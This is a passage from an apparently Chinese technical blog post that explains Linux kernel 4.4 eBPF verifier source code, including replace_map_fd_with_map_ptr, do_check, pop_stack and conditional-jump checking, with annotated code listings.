*/</span><br>ret = convert_ctx_accesses(env);<br><br><span class="hljs-keyword">if</span> (log_level &amp;&amp; log_len &gt;= log_size - <span class="hljs-number">1</span>) &#123;<br>BUG_ON(log_len &gt;= log_size);<br><span class="hljs-comment">/* verifier log exceeded user supplied buffer */</span><br>ret = -ENOSPC;<br><span class="hljs-comment">/* fall through to return what was recorded */</span><br>&#125;<br><br><span class="hljs-comment">/* copy verifier log back to user space including trailing zero */</span><br><span class="hljs-keyword">if</span> (log_level &amp;&amp; copy_to_user(log_ubuf, log_buf, log_len + <span class="hljs-number">1</span>) != <span class="hljs-number">0</span>) &#123;<br>ret = -EFAULT;<br><span class="hljs-keyword">goto</span> free_log_buf;<br>&#125;<br><br><span class="hljs-keyword">if</span> (ret == <span class="hljs-number">0</span> &amp;&amp; env-&gt;used_map_cnt) &#123;<br><span class="hljs-comment">/* if program passed verifier, update used_maps in bpf_prog_info */</span><br>env-&gt;prog-&gt;aux-&gt;used_maps = kmalloc_array(env-&gt;used_map_cnt,<br>  <span class="hljs-keyword">sizeof</span>(env-&gt;used_maps[<span class="hljs-number">0</span>]),<br>  GFP_KERNEL);<br><br><span class="hljs-keyword">if</span> (!env-&gt;prog-&gt;aux-&gt;used_maps) &#123;<br>ret = -ENOMEM;<br><span class="hljs-keyword">goto</span> free_log_buf;<br>&#125;<br><br><span class="hljs-built_in">memcpy</span>(env-&gt;prog-&gt;aux-&gt;used_maps, env-&gt;used_maps,<br>       <span class="hljs-keyword">sizeof</span>(env-&gt;used_maps[<span class="hljs-number">0</span>]) * env-&gt;used_map_cnt);<br>env-&gt;prog-&gt;aux-&gt;used_map_cnt = env-&gt;used_map_cnt;<br><br><span class="hljs-comment">/* program is valid. Convert pseudo bpf_ld_imm64 into generic</span><br><span class="hljs-comment"> * bpf_ld_imm64 instructions</span><br><span class="hljs-comment"> */</span><br>convert_pseudo_ld_imm64(env);<br>&#125;<br><br>free_log_buf:<br><span class="hljs-keyword">if</span> (log_level)<br>vfree(log_buf);<br>free_env:<br><span class="hljs-keyword">if</span> (!env-&gt;prog-&gt;aux-&gt;used_maps)<br><span class="hljs-comment">/* if we didn&#x27;t copy map pointers into bpf_prog_info, release</span><br><span class="hljs-comment"> * them now. Otherwise free_bpf_prog_info() will release them.</span><br><span class="hljs-comment"> */</span><br>release_maps(env);<br>*prog = env-&gt;prog;<br>kfree(env);<br>mutex_unlock(&amp;bpf_verifier_lock);<br><span class="hljs-keyword">return</span> ret;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="replace-map-fd-with-map-ptr"><a href="#replace-map-fd-with-map-ptr" class="headerlink" title="replace_map_fd_with_map_ptr"></a>replace_map_fd_with_map_ptr</h4><a href="https://elixir.bootlin.com/linux/v4.4.110/source/kernel/bpf/verifier.c#L1990">replace_map_fd_with_map_ptr</a>函数中，可以看到当满足[1]、[2]两个条件时，即opcode = BPF_LD | BPF_IMM | BPF_DW=0x18，且src_reg = BPF_PSEUDO_MAP_FD = 1时，将根据imm的值进行map查找，并将得到的地址分成两部分，分别存储于该条指令和下一条指令的imm部分，与上文所说的占用两条指令是相符的。满足上述两个条件的语句又被命名为BPF_LD_MAP_FD，即把map地址放到寄存器里，该指令写完后，下一条指令应为无意义的填充。<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">replace_map_fd_with_map_ptr</span><span class="hljs-params">(struct verifier_env *env)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_insn</span> *<span class="hljs-title">insn</span> =</span> env-&gt;prog-&gt;insnsi;<br><span class="hljs-keyword">int</span> insn_cnt = env-&gt;prog-&gt;len;<br><span class="hljs-keyword">int</span> i, j;<br><br><span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; insn_cnt; i++, insn++) &#123;<br><span class="hljs-keyword">if</span> (BPF_CLASS(insn-&gt;code) == BPF_LDX &amp;&amp;<br>    (BPF_MODE(insn-&gt;code) != BPF_MEM || insn-&gt;imm != <span class="hljs-number">0</span>)) &#123;<br>verbose(<span class="hljs-string">&quot;BPF_LDX uses reserved fields\n&quot;</span>);<br><span class="hljs-keyword">return</span> -EINVAL;<br>&#125;<span class="hljs-comment">// 不允许向寄存器直接写值 LDX</span><br><br><span class="hljs-keyword">if</span> (BPF_CLASS(insn-&gt;code) == BPF_STX &amp;&amp;<br>    ((BPF_MODE(insn-&gt;code) != BPF_MEM &amp;&amp;<br>      BPF_MODE(insn-&gt;code) != BPF_XADD) || insn-&gt;imm != <span class="hljs-number">0</span>)) &#123;<br>verbose(<span class="hljs-string">&quot;BPF_STX uses reserved fields\n&quot;</span>);<br><span class="hljs-keyword">return</span> -EINVAL;<br>&#125;<span class="hljs-comment">// 不允许向地址写寄存器 STX</span><br><br>[<span class="hljs-number">1</span>]<span class="hljs-keyword">if</span> (insn[<span class="hljs-number">0</span>].code == (BPF_LD | BPF_IMM | BPF_DW)) &#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_map</span> *<span class="hljs-title">map</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fd</span> <span class="hljs-title">f</span>;</span><br><br><span class="hljs-keyword">if</span> (i == insn_cnt - <span class="hljs-number">1</span> || insn[<span class="hljs-number">1</span>].code != <span class="hljs-number">0</span> ||<br>    insn[<span class="hljs-number">1</span>].dst_reg != <span class="hljs-number">0</span> || insn[<span class="hljs-number">1</span>].src_reg != <span class="hljs-number">0</span> ||<br>    insn[<span class="hljs-number">1</span>].off != <span class="hljs-number">0</span>) &#123;<br>verbose(<span class="hljs-string">&quot;invalid bpf_ld_imm64 insn\n&quot;</span>);<br><span class="hljs-keyword">return</span> -EINVAL;<br>&#125;<span class="hljs-comment">// 最后一条指令，下一条指令确定为0</span><br><br><span class="hljs-keyword">if</span> (insn-&gt;src_reg == <span class="hljs-number">0</span>)<br><span class="hljs-comment">/* valid generic load 64-bit imm */</span><br><span class="hljs-keyword">goto</span> next_insn;<br><br>[<span class="hljs-number">2</span>]<span class="hljs-keyword">if</span> (insn-&gt;src_reg != BPF_PSEUDO_MAP_FD) &#123;<br>verbose(<span class="hljs-string">&quot;unrecognized bpf_ld_imm64 insn\n&quot;</span>);<br><span class="hljs-keyword">return</span> -EINVAL;<br>&#125;<br><br>f = fdget(insn-&gt;imm);<br><span class="hljs-built_in">map</span> = __bpf_map_get(f);<br><span class="hljs-keyword">if</span> (IS_ERR(<span class="hljs-built_in">map</span>)) &#123;<br>verbose(<span class="hljs-string">&quot;fd %d is not pointing to valid bpf_map\n&quot;</span>,<br>insn-&gt;imm);<br><span class="hljs-keyword">return</span> PTR_ERR(<span class="hljs-built_in">map</span>);<br>&#125;<br><br><span class="hljs-comment">/* store map pointer inside BPF_LD_IMM64 instruction */</span><br>insn[<span class="hljs-number">0</span>].imm = (u32) (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) <span class="hljs-built_in">map</span>;<br>insn[<span class="hljs-number">1</span>].imm = ((u64) (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) <span class="hljs-built_in">map</span>) &gt;&gt; <span class="hljs-number">32</span>;<br><br><span class="hljs-comment">/* check whether we recorded this map already */</span><br><span class="hljs-keyword">for</span> (j = <span class="hljs-number">0</span>; j &lt; env-&gt;used_map_cnt; j++)<br><span class="hljs-keyword">if</span> (env-&gt;used_maps[j] == <span class="hljs-built_in">map</span>) &#123;<br>fdput(f);<br><span class="hljs-keyword">goto</span> next_insn;<br>&#125;<br><br><span class="hljs-keyword">if</span> (env-&gt;used_map_cnt &gt;= MAX_USED_MAPS) &#123;<br>fdput(f);<br><span class="hljs-keyword">return</span> -E2BIG;<br>&#125;<br><br><span class="hljs-comment">/* hold the map. If the program is rejected by verifier,</span><br><span class="hljs-comment"> * the map will be released by release_maps() or it</span><br><span class="hljs-comment"> * will be used by the valid program until it&#x27;s unloaded</span><br><span class="hljs-comment"> * and all maps are released in free_bpf_prog_info()</span><br><span class="hljs-comment"> */</span><br><span class="hljs-built_in">map</span> = bpf_map_inc(<span class="hljs-built_in">map</span>, <span class="hljs-literal">false</span>);<br><span class="hljs-keyword">if</span> (IS_ERR(<span class="hljs-built_in">map</span>)) &#123;<br>fdput(f);<br><span class="hljs-keyword">return</span> PTR_ERR(<span class="hljs-built_in">map</span>);<br>&#125;<br>env-&gt;used_maps[env-&gt;used_map_cnt++] = <span class="hljs-built_in">map</span>;<br><br>fdput(f);<br>next_insn:<br>insn++;<br>i++;<br>&#125;<br>&#125;<br><br><span class="hljs-comment">/* now all pseudo BPF_LD_IMM64 instructions load valid</span><br><span class="hljs-comment"> * &#x27;struct bpf_map *&#x27; into a register instead of user map_fd.</span><br><span class="hljs-comment"> * These pointers will be used later by verifier to validate map access.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="do-check"><a href="#do-check" class="headerlink" title="do_check"></a>do_check</h4>下面进行check过程中最核心的<a href="https://elixir.bootlin.com/linux/v4.4.110/source/kernel/bpf/verifier.c#L1723">do_check</a>函数，首先可以看到整个程序处于一个for死循环中，其中维护了一系列寄存器，其寄存器变量定义和初始化如下，可以看到寄存器的值是一个int类型，并且有一个枚举的type变量，type类型包括未定义、位置、立即数、指针等，初始化时会将全部寄存器类型定义为未定义，赋值为0。第十个寄存器定义为栈指针，第一个定义为内容指针。<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">reg_state</span> &#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">bpf_reg_type</span> <span class="hljs-title">type</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br>        <span class="hljs-comment">/* valid when type == CONST_IMM | PTR_TO_STACK */</span><br>        <span class="hljs-keyword">int</span> imm;<br><br>        <span class="hljs-comment">/* valid when type == CONST_PTR_TO_MAP | PTR_TO_MAP_VALUE |</span><br><span class="hljs-comment">         *   PTR_TO_MAP_VALUE_OR_NULL</span><br><span class="hljs-comment">         */</span><br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_map</span> *<span class="hljs-title">map_ptr</span>;</span><br>    &#125;;<br>&#125;;<br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">init_reg_state</span><span class="hljs-params">(struct reg_state *regs)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> i;<br><br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; MAX_BPF_REG; i++) &#123;<br>        regs[i].type = NOT_INIT;<br>        regs[i].imm = <span class="hljs-number">0</span>;<br>        regs[i].map_ptr = <span class="hljs-literal">NULL</span>;<br>    &#125;<br><br>    <span class="hljs-comment">/* frame pointer */</span><br>    regs[BPF_REG_FP].type = FRAME_PTR;<br><br>    <span class="hljs-comment">/* 1st arg to a function */</span><br>    regs[BPF_REG_1].type = PTR_TO_CTX;<br>&#125;<br><span class="hljs-comment">/* types of values stored in eBPF registers */</span><br><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">bpf_reg_type</span> &#123;</span><br>    NOT_INIT = <span class="hljs-number">0</span>,        <span class="hljs-comment">/* nothing was written into register */</span><br>    UNKNOWN_VALUE,       <span class="hljs-comment">/* reg doesn&#x27;t contain a valid pointer */</span><br>    PTR_TO_CTX,      <span class="hljs-comment">/* reg points to bpf_context */</span><br>    CONST_PTR_TO_MAP,    <span class="hljs-comment">/* reg points to struct bpf_map */</span><br>    PTR_TO_MAP_VALUE,    <span class="hljs-comment">/* reg points to map element value */</span><br>    PTR_TO_MAP_VALUE_OR_NULL,<span class="hljs-comment">/* points to map elem value or NULL */</span><br>    FRAME_PTR,       <span class="hljs-comment">/* reg == frame_pointer */</span><br>    PTR_TO_STACK,        <span class="hljs-comment">/* reg == frame_pointer + imm */</span><br>    CONST_IMM,       <span class="hljs-comment">/* constant integer value */</span><br>&#125;;<br></code></pre></td></tr></table></figure>check函数的处理方式是逐条处理，按照不同的类型分别做check。<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">do_check</span><span class="hljs-params">(struct verifier_env *env)</span></span><br><span class="hljs-function"></span>&#123;<br>    ...<br>    init_reg_state(regs);<br>    insn_idx = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (;;) &#123;<br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_insn</span> *<span class="hljs-title">insn</span>;</span><br>        u8 <span class="hljs-class"><span class="hljs-keyword">class</span>;</span><br>        <span class="hljs-keyword">int</span> err;<br>    <br>        <span class="hljs-keyword">if</span> (insn_idx &gt;= insn_cnt) &#123;<br>            verbose(<span class="hljs-string">&quot;invalid insn idx %d insn_cnt %d\n&quot;</span>,<br>                insn_idx, insn_cnt);<br>            <span class="hljs-keyword">return</span> -EFAULT;<br>        &#125;<br>    <br>           <span class="hljs-comment">//每次取一条指令</span><br>        insn = &amp;insns[insn_idx]; <br>        <span class="hljs-comment">//获取指令的操作码</span><br>        <span class="hljs-class"><span class="hljs-keyword">class</span> =</span> BPF_CLASS(insn-&gt;code);<br>        ...<br></code></pre></td></tr></table></figure>由于指令比较多，不一样赘述了，下面从两个攻击角度去展示程序是如何检测的。<h5 id="for循环检查结束并退出"><a href="#for循环检查结束并退出" class="headerlink" title="for循环检查结束并退出"></a>for循环检查结束并退出</h5>退出指令定义为BPF_EXIT，这个指令属于BPF_JMP大类，可以看到当指令为该条指令的时候会执行一个pop_stack操作，而当这个函数的返回值是负数的时候，用break跳出死循环。否则会用这个作为取值的位置去执行下一条指令。对于这个操作的理解是，当遇到条件跳转的时候，程序会默认执行一个分支，然后将另外一个分支压入stack中，当一个分支执行结束后，去检查另外一个分支，类似于迷宫问题解决里走到思路的退栈操作。<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (class == BPF_JMP) &#123;<br>u8 opcode = BPF_OP(insn-&gt;code);<br><br><span class="hljs-keyword">if</span> (opcode == BPF_CALL) &#123;<br><span class="hljs-keyword">if</span> (BPF_SRC(insn-&gt;code) != BPF_K ||<br>    insn-&gt;off != <span class="hljs-number">0</span> ||<br>    insn-&gt;src_reg != BPF_REG_0 ||<br>    insn-&gt;dst_reg != BPF_REG_0) &#123;<br>verbose(<span class="hljs-string">&quot;BPF_CALL uses reserved fields\n&quot;</span>);<br><span class="hljs-keyword">return</span> -EINVAL;<br>&#125;<br><br>err = check_call(env, insn-&gt;imm);<br><span class="hljs-keyword">if</span> (err)<br><span class="hljs-keyword">return</span> err;<br><br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (opcode == BPF_JA) &#123;<br><span class="hljs-keyword">if</span> (BPF_SRC(insn-&gt;code) != BPF_K ||<br>    insn-&gt;imm != <span class="hljs-number">0</span> ||<br>    insn-&gt;src_reg != BPF_REG_0 ||<br>    insn-&gt;dst_reg != BPF_REG_0) &#123;<br>verbose(<span class="hljs-string">&quot;BPF_JA uses reserved fields\n&quot;</span>);<br><span class="hljs-keyword">return</span> -EINVAL;<br>&#125;<br><br>insn_idx += insn-&gt;off + <span class="hljs-number">1</span>;<br><span class="hljs-keyword">continue</span>;<br><br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (opcode == BPF_EXIT) &#123;<br><span class="hljs-keyword">if</span> (BPF_SRC(insn-&gt;code) != BPF_K ||<br>    insn-&gt;imm != <span class="hljs-number">0</span> ||<br>    insn-&gt;src_reg != BPF_REG_0 ||<br>    insn-&gt;dst_reg != BPF_REG_0) &#123;<br>verbose(<span class="hljs-string">&quot;BPF_EXIT uses reserved fields\n&quot;</span>);<br><span class="hljs-keyword">return</span> -EINVAL;<br>&#125;<br><br><span class="hljs-comment">/* eBPF calling convetion is such that R0 is used</span><br><span class="hljs-comment"> * to return the value from eBPF program.</span><br><span class="hljs-comment"> * Make sure that it&#x27;s readable at this time</span><br><span class="hljs-comment"> * of bpf_exit, which means that program wrote</span><br><span class="hljs-comment"> * something into it earlier</span><br><span class="hljs-comment"> */</span><br>err = check_reg_arg(regs, BPF_REG_0, SRC_OP);<br><span class="hljs-keyword">if</span> (err)<br><span class="hljs-keyword">return</span> err;<br><br><span class="hljs-keyword">if</span> (is_pointer_value(env, BPF_REG_0)) &#123;<br>verbose(<span class="hljs-string">&quot;R0 leaks addr as return value\n&quot;</span>);<br><span class="hljs-keyword">return</span> -EACCES;<br>&#125;<br><br>process_bpf_exit:<br>insn_idx = pop_stack(env, &amp;prev_insn_idx);<br><span class="hljs-keyword">if</span> (insn_idx &lt; <span class="hljs-number">0</span>) &#123;<br><span class="hljs-keyword">break</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>do_print_state = <span class="hljs-literal">true</span>;<br><span class="hljs-keyword">continue</span>;<br>&#125;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>err = check_cond_jmp_op(env, insn, &amp;insn_idx);<br><span class="hljs-keyword">if</span> (err)<br><span class="hljs-keyword">return</span> err;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure>查看一下pop_stack函数，函数中先判断env-&gt;head是否为0，如果是就代表没有未检查的路径了。否则将保持的state恢复。<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">pop_stack</span><span class="hljs-params">(struct verifier_env *env, <span class="hljs-keyword">int</span> *prev_insn_idx)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">verifier_stack_elem</span> *<span class="hljs-title">elem</span>;</span><br><span class="hljs-keyword">int</span> insn_idx;<br><br><span class="hljs-keyword">if</span> (env-&gt;head == <span class="hljs-literal">NULL</span>)<br><span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br><br><span class="hljs-built_in">memcpy</span>(&amp;env-&gt;cur_state, &amp;env-&gt;head-&gt;st, <span class="hljs-keyword">sizeof</span>(env-&gt;cur_state));<br>insn_idx = env-&gt;head-&gt;insn_idx;<br><span class="hljs-keyword">if</span> (prev_insn_idx)<br>*prev_insn_idx = env-&gt;head-&gt;prev_insn_idx;<br>elem = env-&gt;head-&gt;next;<br>kfree(env-&gt;head);<br>env-&gt;head = elem;<br>env-&gt;stack_size--;<br><span class="hljs-keyword">return</span> insn_idx;<br>&#125;<br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> MAX_USED_MAPS 64 <span class="hljs-comment">/* max number of maps accessed by one eBPF program */</span></span><br><br><span class="hljs-comment">/* single container for all structs</span><br><span class="hljs-comment"> * one verifier_env per bpf_check() call</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">verifier_env</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_prog</span> *<span class="hljs-title">prog</span>;</span><span class="hljs-comment">/* eBPF program being verified */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">verifier_stack_elem</span> *<span class="hljs-title">head</span>;</span> <span class="hljs-comment">/* stack of verifier states to be processed */</span><br><span class="hljs-keyword">int</span> stack_size;<span class="hljs-comment">/* number of states to be processed */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">verifier_state</span> <span class="hljs-title">cur_state</span>;</span> <span class="hljs-comment">/* current verifier state */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">verifier_state_list</span> **<span class="hljs-title">explored_states</span>;</span> <span class="hljs-comment">/* search pruning optimization */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_map</span> *<span class="hljs-title">used_maps</span>[<span class="hljs-title">MAX_USED_MAPS</span>];</span> <span class="hljs-comment">/* array of map&#x27;s used by eBPF program */</span><br>u32 used_map_cnt;<span class="hljs-comment">/* number of used maps */</span><br><span class="hljs-keyword">bool</span> allow_ptr_leaks;<br>&#125;;<br></code></pre></td></tr></table></figure>然后看一下条件分支的处理代码check_cond_jmp_op，我们可以看到这个检查将跳转分成两种，第一种[1]处是JEQ和JNE，并且是比较的值是立即数的情况，此时就判断立即数是不是等于要比较的寄存器，进行直接跳转。第二种[2]处是其他情况，均需把off+1的值压入栈中作为另一条分支。<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><code class="hljs c"> <span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">check_cond_jmp_op</span><span class="hljs-params">(struct verifier_env *env,</span></span><br><span class="hljs-params"><span class="hljs-function">     struct bpf_insn *insn, <span class="hljs-keyword">int</span> *insn_idx)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">reg_state</span> *<span class="hljs-title">regs</span> =</span> env-&gt;cur_state.regs;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">verifier_state</span> *<span class="hljs-title">other_branch</span>;</span><br>u8 opcode = BPF_OP(insn-&gt;code);<br><span class="hljs-keyword">int</span> err;<br><br><span class="hljs-keyword">if</span> (opcode &gt; BPF_EXIT) &#123;<br>verbose(<span class="hljs-string">&quot;invalid 